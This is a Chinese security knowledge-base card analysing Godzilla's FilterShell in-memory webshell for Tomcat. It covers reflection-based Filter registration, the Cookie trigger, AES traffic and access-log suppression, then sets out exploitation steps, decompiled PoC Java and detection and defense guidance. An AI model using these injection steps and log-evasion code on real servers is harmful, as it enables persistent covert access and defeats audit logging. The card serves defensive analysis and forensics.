---
id: web-java-component-tomcat-godzilla-filtershell-memshell
title: 哥斯拉 FilterShell：Tomcat 动态 Filter 内存马（Cookie 触发 + noLog）
type: scenario
domain: web
path: web/java/component/tomcat
technique: godzilla-tomcat-filtershell-memshell
tags:
- java
- tomcat
- memshell
- filter
- webshell
- godzilla
- persistence
- defense-evasion
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V41
  verified_at: '2026-11-05T06:34:13+08:00'
  notes: 已对照原文与截图核对：FilterShell 两条注入包明文（secretKey/evalClassName/ck/methodName/pwd）、BeanDeserializerFactory 反编译类的 addFilter 注册流程（FilterMap/FilterDef/ApplicationFilterConfig/filterConfigs/findFilterMaps 重排）、Cookie 触发 doFilter、noLog 与 getALlFilter 输出（BeanDeserializerFactory1782055646198 / BeanSerializerFactory1782055523016 / Tomcat WebSocket Filter）均与卡片一致；原文 Tomcat 9.0.118 + JDK8 为实验环境、无受影响版本区间，故未标 affected_versions。未在本机实际注入。
url: /docs/web/java/component/tomcat/web-java-component-tomcat-godzilla-filtershell-memshell/
draft: false
kb_aliases:
- Godzilla FilterShell
- 哥斯拉 FilterShell
- Tomcat Filter 型内存马
- Cookie 触发内存马
- noLog 关闭访问日志
---

## 一句话结论

在已能于 Tomcat Web 应用内执行 Java 代码（或已通过 Godzilla 的 JSP 马取得代码执行）的前提下，哥斯拉的 FilterShell 插件会把一个 `Filter` 字节码通过 `defineClass` 载入内存，反射构造 `ApplicationFilterConfig`、直接写入 `StandardContext.filterConfigs` 并把自身映射调整到 `/*` 链首；该 Filter 只在请求携带指定 Cookie 时进入 WebShell 逻辑，其余请求正常放行，同时通过修改 Valve 的 `condition` 关闭/绕过访问日志，重启前持续有效。

## 原理

- **注入前提**：内存马的注入本质是执行 Java 代码。攻击者先用哥斯拉的 JSP/JSPX 马（JavaDynamicPayload）获得 `defineClass` 与反射能力，再由 FilterShell 插件发送第二段 payload 完成注册。
- **恶意类形态**：反编译出的类（样本伪装为 `org.apache.coyote.deser.BeanDeserializerFactory`）同时 `extends ClassLoader` 并 `implements Filter, Servlet, ServletConfig`；`Q(byte[])` 封装 `defineClass`，`equals(Object)` 从参数 Map 取出 `pwd`、`ck`、`secretKey`，`toString()` 触发 `addFilter(this, getStandardContext())`。
- **注册 Filter**：`addFilter` 取当前 `ServletContext` 的 `context` 字段再取 `StandardContext`，然后：
  1. `filterName = 类简名 + System.currentTimeMillis()`（如 `BeanDeserializerFactory1782055646198`），用于伪装成框架类；
  2. 新建 `FilterMap`，`setURLPattern("/*")`、`addURLPattern("/*")`、`setFilterName(filterName)`；
  3. 新建 `FilterDef`，先临时 `setFilterClass("org.apache.catalina.filters.SetCharacterEncodingFilter")` 通过校验，再反射构造 `ApplicationFilterConfig(context, filterDef)` 并 `setAccessible(true)`；
  4. 用反射把 `ApplicationFilterConfig.filter` 字段替换为当前恶意 Filter 实例，恢复 `filterClass` 为恶意类名，调用 `filter.init(config)`；
  5. `StandardContext.addFilterDef(filterDef)`、`addFilterMap(filterMap)`，再取 `StandardContext.filterConfigs` 这个 `HashMap` 直接 `put(filterName, applicationFilterConfig)`；
  6. `findFilterMaps()` 取出数组，把自身 `FilterMap` 换到下标 0，确保在 Filter 链最前面执行。
- **触发逻辑**：`doFilter` 遍历 `request.getCookies()`，只有出现与 `this.ck` 同名的 Cookie 才调用 `_jspService` 进入 WebShell，否则 `chain.doFilter` 放行。因此正常业务请求不会看到异常响应，扫描器也难以通过普通访问发现。
- **通信协议**：`_jspService` 复用哥斯拉 JAVA_AES_BASE64：`data = base64Decode(request.getParameter(Pwd))`，AES 解密；session 无 payload 时 `defineClass` 并保存，否则实例化、`equals(pageContext)`、写出 `md5(Pwd+secretKey)[:16] + base64(AES(结果)) + md5[16:]`。所以连接内存马时，Cookie 触发与 `pass` 参数/密文同时出现。
- **日志规避**：`noLog(PageContext)` 从 `ServletContext` 反射出 `ApplicationContext`/`StandardContext`，沿 `getParent()` 遍历容器层级，对每个 Pipeline 的 Valve 检查是否存在 `getCondition`/`setCondition`；存在则把 `condition` 设为 `"FuckLog"`（并在 request 上设置同名属性），使 `AccessLogValve` 的条件不成立，从而不记录访问日志。
- **持久性**：注册结果只存在于 JVM 内存（`filterDefs`/`filterMaps`/`filterConfigs`），不落盘；Tomcat 重启后消失，但删除 JSP 文件不会清除它。

## 触发条件

- 目标为 Tomcat（原文实验环境为 Tomcat 9.0.118 + JDK 8，使用 `javax.servlet`）；需要已具备在 Web 应用上下文执行 Java 代码的能力（JSP 马、反序列化、表达式注入、任意类加载等）。
- 能取得 `StandardContext`（`ServletContext` → `context` → `context` 的反射路径在 Tomcat 9 成立；嵌入式/其他版本字段可能不同）。
- 恶意 Filter 字节码与目标容器的 Servlet API 命名空间一致（Tomcat 9 为 `javax.servlet`，Tomcat 10+ 为 `jakarta.servlet`）。原文指出 Tomcat 10 未能注入哥斯拉内存马，实际利用前需按版本验证。
- 目标未通过 RASP/Java Agent 拦截 `defineClass`、`ApplicationFilterConfig` 构造、`filterConfigs` 修改等行为。

## 利用步骤

1. 通过已有入口上传并连接哥斯拉 JSP/JSPX 马（JavaDynamicPayload）。
2. 打开 FilterShell 插件，设置 `password`（连接密码/参数名）、`secretKey`（AES 密钥）、`Cookie`（触发 Cookie 名，如 `d7b8f27e2f162561`）、`payload`（如 `AES_BASE64`）。
3. 点击 `addFilterShell`：第一条大包发送 Filter 类字节码并 `defineClass`，第二条包发送注册参数（`secretKey`、`evalClassName`、`ck`、`methodName=run`、`pwd`），响应 `ok`。
4. 点击 `getALlFilter` 枚举当前 Filter，确认出现 `类名+时间戳`、`urlPatterns: [/*]` 的新条目，且与正常 Filter 并列。
5. 用哥斯拉新建连接，URL 指向任意路径，密码/密钥与 FilterShell 配置一致，并在请求中携带触发 Cookie；可执行命令、文件管理等操作。
6. 清理时点击 `removeFilter`，或重启 Tomcat；排查时优先检查内存中的 Filter 链而不是磁盘文件。

## PoC

FilterShell 注入请求解密后的明文（键值按出现顺序）：

```text
secretKey3c6e0b8a9c15224aevalClassNameorg.apache.coyote.deser.BeanDeserializerFactoryckd7b8f27e2f162561methodNamerunpwdpass
```

核心注册逻辑（按反编译结果最小化）：

```java
public String addFilter(Filter filter, Object standardContext) throws Exception {
    String filterName = filter.getClass().getSimpleName() + System.currentTimeMillis();
    Class<?> ctxClass = standardContext.getClass();
    Object filterMap = ctxClass.getDeclaredMethod("addFilterMap").getParameterTypes()[0].newInstance();
    Object filterDef = ctxClass.getDeclaredMethod("addFilterDef").getParameterTypes()[0].newInstance();

    invoke(filterMap, "setURLPattern", "/*");
    invoke(filterMap, "addURLPattern", "/*");
    invoke(filterMap, "setFilterName", filterName);
    invoke(filterDef, "setFilterName", filterName);
    invoke(filterDef, "setFilterClass", "org.apache.catalina.filters.SetCharacterEncodingFilter");

    Constructor<?> c = Class.forName("org.apache.catalina.core.ApplicationFilterConfig")
        .getDeclaredConstructor(Class.forName("org.apache.catalina.Context"), filterDef.getClass());
    c.setAccessible(true);
    Object config = c.newInstance(standardContext, filterDef);
    setFieldValue(config, "filter", filter);
    invoke(filterDef, "setFilterClass", filter.getClass().getName());
    filter.init((FilterConfig) config);

    invoke(standardContext, "addFilterDef", filterDef);
    invoke(standardContext, "addFilterMap", filterMap);
    ((HashMap) getFieldValue(standardContext, "filterConfigs")).put(filterName, config);

    // 把自身 FilterMap 移到数组下标 0，保证最先执行
    Object[] maps = (Object[]) invoke(standardContext, "findFilterMaps");
    // ...重排逻辑...
    return "ok";
}
```

触发判断：

```java
public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {
    HttpServletRequest request = (HttpServletRequest) req;
    for (Cookie cookie : request.getCookies()) {
        if (cookie.getName().equals(this.ck)) {
            this._jspService(request, (HttpServletResponse) resp); // 进入 WebShell
            return;
        }
    }
    chain.doFilter(req, resp); // 正常请求放行
}
```

`getALlFilter` 的输出形态：

```text
filterName: BeanDeserializerFactory1782055646198 servletNames: [] urlPatterns: [/*]
filterName: BeanSerializerFactory1782055523016 servletNames: [] urlPatterns: [/*]
filterName: Tomcat WebSocket (JSR356) Filter servletNames: [] urlPatterns: [/*]
```

前两条为注入的内存马，最后一条是 Tomcat 正常组件。

## 变体与关联

- **MemoryShell（Servlet 型）**：同一插件的另一种模式，注册路径如 `/favicon.ico`；解密后的注入参数为 `path/favicon.icosecretKey...evalClassName...methodNamerunpwpassword`，响应 `ok`。之后直接访问该路径并携带密码参数即可。
- **ServletManage / JarLoader**：前者枚举/卸载 Servlet 型内存马，后者动态加载外部 JAR；与 FilterShell 同属哥斯拉内存马工具链。
- **注册 API 变体**：本样本手工构造 `ApplicationFilterConfig` 并写 `filterConfigs`、重排 `filterMaps`；通用做法还包括 `StandardContext.addFilterDef/addFilterMapBefore/filterStart`（见关联卡），两者在 Tomcat 版本/字段可见性上可能不同。
- **其他容器组件内存马**：Tomcat Listener、Valve、UpgradeProtocol、Executor 等注册点见 `web/java/component/tomcat` 下的关联卡；Spring WebFlux 等非 Servlet 容器另有 `FilteringWebHandler.chain` 替换手法。
- 关联卡片：[[web-java-component-tomcat-dynamic-filter-memshell]]、[[defense-forensics-godzilla-java-webshell-traffic-decode]]、[[web-java-classloader-jsp-memory-servlet-webshell]]、[[web-java-framework-spring-webflux-filteringwebhandler-memshell]]。

## 检测与防御

- **运行时枚举**：`getALlFilter`/arthas/java-memshell-scanner 检查 `StandardContext.filterDefs`、`filterMaps`、`filterConfigs`；重点看 `filterName` 是否呈 `类简名+13位时间戳`、`filterClass` 是否为业务无关的框架伪装名（如 `org.apache.coyote.deser.*`）、URL 是否为 `/*`。
- **行为特征**：`ClassLoader#defineClass` 定义无 `CodeSource` 的类；反射构造 `ApplicationFilterConfig` 并修改 `filter` 字段；直接 `put` 进 `filterConfigs`；运行期调用 `findFilterMaps` 并重排数组；`AccessLogValve` 的 `condition` 被改为 `FuckLog` 或日志突然缺失。
- **流量特征**：同一 JSP 先出现一次大 POST（class 字节码）与空响应，随后出现 `secretKey/evalClassName/ck/methodName/pwd` 等键值；连接内存马时任意 URL 同时出现 `pass=<AES Base64>` 与固定 Cookie，响应为 16 位大写 MD5 + Base64 + 16 位 MD5。
- **防御**：修复上游 JSP 上传/反序列化/表达式注入入口；部署 RASP 或 Java Agent 监控 `defineClass`、`ApplicationFilterConfig`、`filterConfigs`、`addFilterDef/addFilterMap`；对访问日志做完整性监控（日志中断/condition 被修改告警）；应急时重启 Tomcat 并复查 `webapps` 与 session，确认内存马未随 JSP 删除而残留。
